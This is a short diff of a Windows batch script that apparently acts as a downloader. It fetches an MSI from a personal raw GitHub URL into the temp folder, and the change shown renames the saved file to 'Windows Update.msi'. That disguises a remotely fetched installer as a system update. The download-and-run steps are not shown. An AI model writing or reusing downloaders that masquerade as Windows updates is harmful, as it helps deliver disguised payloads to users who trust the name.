@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 :: Put your MSI download URL here
 set "url=https://raw.githubusercontent.com/kevin64848/files/refs/heads/main/file.msi"
 
-set "outputFileName=file.msi"
+set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
 :: Delete existing file if any
